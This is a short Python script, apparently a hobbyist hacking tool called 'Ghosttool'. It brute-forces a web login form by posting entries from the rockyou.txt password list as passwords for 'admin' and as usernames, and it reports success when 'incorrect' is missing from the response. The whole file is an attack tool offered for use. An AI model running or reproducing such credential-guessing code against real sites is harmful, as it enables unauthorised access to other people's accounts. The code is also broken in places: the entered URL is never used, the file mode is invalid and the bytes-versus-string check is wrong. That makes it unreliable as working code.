import requests
import sys
import os
import time

url = 'https://google.com/'                                     # just fill it with smth
def brute(username : str, password : str):
    expression = 'incorrect'
    data = {'username': username,'password': password}
    r = requests.post(url, data=data)
    if expression not in r.content :
        print("[+] Correct password Found: " + str(password))
        sys.exit()
    else:
        print(str(r.content) + " " + str(password))


def main():                            
    #note that you need rockyou.txt
    os.system("clear")
    os.system("figlet BRUTEFORCE")
    print ("----------Ghosttool----------")
    time.sleep(2)
    print ("starting..")
    time.sleep(2)

    url = input('Enter the url: ')                              # Ask user to enter the url

    with open("rockyou.txt", "rw") as file:                     # 'with' construction will close the file when done
        whole_file = file.read()
        words = str(whole_file).split('\n')                     # split file into array (may not work as I expected, read docs)
    for payload in words:
        brute(payload, "a")
        brute("admin", payload)


if __name__ == '__main__':
    main()
